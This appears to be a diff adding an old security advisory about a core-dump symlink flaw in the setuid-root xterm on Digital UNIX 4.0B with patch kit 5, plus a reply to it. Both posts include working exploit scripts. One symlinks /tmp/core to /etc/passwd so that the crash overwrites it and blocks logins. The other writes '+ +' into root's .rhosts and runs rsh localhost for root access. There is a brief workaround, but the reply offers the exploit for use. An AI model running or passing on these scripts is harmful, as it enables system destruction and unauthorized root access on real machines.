@@ -1,0 +1,76 @@
+
+Version Affected:  Digital UNIX 4.0B *with* patch kit 5
+                   Unpatched 4.0B is not vunerable to this particular
+                   problem, but it is to others.
+
+Impact:  Local users may overwrite system files, and possibly obtain root.
+
+Problem:
+
+        Patch kit 5 included a replacement xterm because the old one had a
+bug, too.  They replaced it with another that had a bigger problem.  You
+can cause a segmentation fault in xterm simply by setting your DISPLAY
+variable to a display that you aren't allowed to connect to or one that
+doesn't exist.  Start xterm, and you get a core file.
+
+        Xterm is installed setuid root.  I'm not 100% sure what happens,
+since DEC doesn't release the source for patches.  It does dump core at
+XtOpenApplication(), however.
+
+        Even with a buffer overflow, I've never seen anyone exploit on one
+DU. If anyone has done so sucessfully, plese email me.  Despite that, a
+person with basic knowledge of unix could easily do something like:
+
+#/!bin/csh
+cd /tmp
+ln -s /etc/passwd /tmp/core
+setenv DISPLAY abcdefghi
+/usr/bin/X11/xterm
+
+        The contents of /etc/passwd becomes xterm's core, preventing
+further logins.  Obviously you could do things without an immediate impact
+such as ln -s /vmunix /tmp/core.
+
+Workaround:
+
+        Needless to say, change permissions on xterm, have the users run
+dxterm, its better anyway.
+
+
+                          Tom Leffingwell
+----------------------------------------------------------------------------
+
+
+>        Even with a buffer overflow, I've never seen anyone exploit on one
+>DU. If anyone has done so sucessfully, plese email me.  Despite that, a
+>person with basic knowledge of unix could easily do something like:
+>
+>#/!bin/csh
+>cd /tmp
+>ln -s /etc/passwd /tmp/core
+>setenv DISPLAY abcdefghi
+>/usr/bin/X11/xterm
+>
+>        The contents of /etc/passwd becomes xterm's core, preventing
+>further logins.  Obviously you could do things without an immediate impact
+>such as ln -s /vmunix /tmp/core.
+
+or...if the system you're on is actually running r-services, you could do
+
+#!/bin/sh
+DISPLAY="
++ +
+"
+export DISPLAY
+cd /tmp
+ln -s /.rhosts /tmp/core
+/usr/bin/X11/xterm
+rsh localhost
+
+which sets the DISPLAY variable to an "admit all from all" line and
+the core dump will go into root's .rhosts file.  then all that remains
+is the rsh localhost and you're all set!
+
+considerably easier than a buffer overflow exploit...
+
+andrew@echonyc.com (TheMan)
